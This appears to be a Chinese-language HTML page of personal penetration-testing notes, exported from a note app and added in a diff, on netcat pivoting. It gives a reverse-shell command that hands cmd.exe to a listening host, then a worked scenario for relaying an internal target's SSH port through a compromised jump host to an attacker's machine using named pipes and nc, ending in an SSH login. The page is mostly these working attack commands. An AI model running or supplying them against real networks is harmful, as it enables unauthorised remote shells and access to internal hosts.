@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>nc端口转发</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>nc端口转发</h1><br/><br />反弹shell至某台机器<br /><br />内网机器<br />nc -t -e cmd.exe 192.168.205.1 8888<br /><br />192.168.205.1机器<br />nc -lvp 8888<br /><br /><br /><br /><br /><br />0x00 场景<br />1. 存在三种角色的服务器，分别为攻击目标（T）、跳板机（R）以及攻击源（S）<br />2. 攻击目标（T）、跳板机（R）位于内网中，攻击源（S）具备公网IP，可直接连接<br />3. 攻击者可在跳板机（R）上执行命令，希望将攻击目标（T）的SSH服务转发出来<br /><br /><br />0x01 条件<br />1.跳板机（R）开放 22 端口<br />2.攻击源（S）可被跳板机（R）建立正向连接<br /><br /><br /><br /><br />1. 在攻击源（S）上监听两个端口，其中跳板机（R）连接60444端口，攻击者连接60022，借助命名管道交换数据<br /><br />mkfifo pipe<br />nc -l 60022 0&lt;pipe | nc -l 60444 1&gt;pipe<br /><br /><br /><br />2. 在跳板机（R）上连接攻击目标（T）的22端口与攻击源（S）的60022端口，借助命名管道交换数据<br /><br />mkfifo pipe<br />nc 172.17.0.2 22 0&lt;pipe | nc 192.168.253.65 60444 1&gt;pipe<br /><br /><br /><br />3. 在攻击源（S）上连接本地的60022端口，登录攻击目标（T）的SSH服务<br /><br />ssh root@127.0.0.1 -p 60022<br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
